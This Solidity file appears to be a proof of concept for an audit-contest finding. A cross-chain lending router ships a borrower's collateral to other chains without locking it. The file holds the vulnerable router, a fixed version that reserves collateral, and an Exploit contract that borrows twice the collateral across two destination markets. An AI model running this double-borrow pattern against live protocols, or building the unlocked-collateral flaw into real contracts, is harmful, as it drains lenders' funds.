// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// =============================================================================
//  LEND H-20 — multiple cross-chain borrows reuse the same collateral
//  (sherlock 2025-05-lend-audit-contest, CrossChainRouter.borrowCrossChain
//   L113 @ 713372a1).
//
//  borrowCrossChain reads the borrower's CURRENT collateral and ships it to the
//  destination chain in the LayerZero message, but NEVER locks or reserves it on
//  the source chain before sending. The collateral is only registered after the
//  destination confirms. So a borrower can fire N concurrent borrow requests to N
//  destination chains, each carrying the full collateral value, and each
//  destination approves the full borrow independently — N× the collateral is
//  borrowed. The vulnerable "read collateral → send, no lock" sequence is
//  reproduced faithfully (marked @>).
// =============================================================================

/*//////////////////////////////////////////////////////////////
        Minimal ERC20 (the borrowed asset)
//////////////////////////////////////////////////////////////*/
contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
   LendStorage — collateral bookkeeping. `locked` is the reservation
   that SHOULD be taken when a cross-chain borrow is in flight.
//////////////////////////////////////////////////////////////*/
contract LendStorage {
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public locked;

    function setCollateral(address user, uint256 amt) external {
        collateral[user] = amt;
    }

    function lock(address user, uint256 amt) external {
        locked[user] += amt;
    }

    // Collateral still free to back a new borrow.
    function availableCollateral(address user) external view returns (uint256) {
        return collateral[user] - locked[user];
    }
}

/*//////////////////////////////////////////////////////////////
   DestMarket — the destination chain's money market. Approves a
   borrow up to the collateral value carried in the message and pays
   the borrower from its reserve.
//////////////////////////////////////////////////////////////*/
contract DestMarket {
    Token public immutable token;

    constructor(Token _token) {
        token = _token;
    }

    function handleBorrow(address borrower, uint256 amount, uint256 collateralSent) external {
        require(amount <= collateralSent, "insufficient collateral");
        token.transfer(borrower, amount);
    }
}

/*//////////////////////////////////////////////////////////////
   CrossChainRouter — VULNERABLE. Reads collateral and sends the
   borrow request without locking it, so concurrent requests to
   different destinations all see the full collateral.
//////////////////////////////////////////////////////////////*/
contract CrossChainRouter {
    LendStorage public immutable store;

    constructor(LendStorage _store) {
        store = _store;
    }

    function borrowCrossChain(uint256 _amount, DestMarket dest) external {
        require(_amount != 0, "Zero borrow amount");

        // Get current collateral amount for the LayerZero message
        uint256 collateral = store.availableCollateral(msg.sender);

        // @> The collateral is shipped to the destination and the borrow is
        // @> approved there, but it is NEVER locked/reserved on the source chain
        // @> before sending — so the next request re-reads the SAME full value.
        dest.handleBorrow(msg.sender, _amount, collateral);
    }
}

/*//////////////////////////////////////////////////////////////
   CrossChainRouterFixed — mitigation: reserve the collateral on the
   source chain before dispatching, so a second concurrent request
   sees reduced availability and cannot reuse it.
//////////////////////////////////////////////////////////////*/
contract CrossChainRouterFixed {
    LendStorage public immutable store;

    constructor(LendStorage _store) {
        store = _store;
    }

    function borrowCrossChain(uint256 _amount, DestMarket dest) external {
        require(_amount != 0, "Zero borrow amount");
        uint256 collateral = store.availableCollateral(msg.sender);
        require(_amount <= collateral, "insufficient collateral");
        store.lock(msg.sender, _amount); // FIX: reserve before sending
        dest.handleBorrow(msg.sender, _amount, collateral);
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — borrows the full collateral value on TWO destination
   chains using the same 1,000-unit collateral, ending with 2,000
   borrowed against 1,000 of collateral (1,000 unbacked).
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // unbacked-borrow sink

    uint256 internal constant COLLATERAL = 1_000e18;

    Token public token;
    LendStorage public store;
    DestMarket public destB;
    DestMarket public destC;
    CrossChainRouter public router;

    function run() external payable {
        token = new Token();
        store = new LendStorage();
        destB = new DestMarket(token);
        destC = new DestMarket(token);
        router = new CrossChainRouter(store);

        // Attacker posts 1,000 of collateral on the source chain.
        store.setCollateral(address(this), COLLATERAL);

        // Each destination market can fund a full borrow.
        token.mint(address(destB), COLLATERAL);
        token.mint(address(destC), COLLATERAL);

        // Two cross-chain borrows to different destinations, same collateral.
        router.borrowCrossChain(COLLATERAL, destB); // approved: 1,000
        router.borrowCrossChain(COLLATERAL, destC); // approved again: 1,000

        // 2,000 borrowed against 1,000 collateral → 1,000 is unbacked.
        uint256 borrowed = token.balanceOf(address(this)); // 2,000
        uint256 unbacked = borrowed - COLLATERAL; // 1,000
        token.transfer(SINK, unbacked);
    }
}
